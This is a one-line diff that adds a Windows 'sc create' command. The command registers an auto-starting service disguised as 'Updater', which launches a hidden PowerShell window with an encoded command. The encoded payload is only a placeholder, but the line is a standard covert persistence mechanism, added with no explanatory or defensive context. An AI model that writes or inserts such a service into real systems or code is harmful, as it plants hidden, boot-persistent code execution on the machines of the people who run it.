@@ -1,0 +1,2 @@
+sc create Updater binPath= "cmd /c powershell -nop -w hidden -enc AAAA" start= auto
+
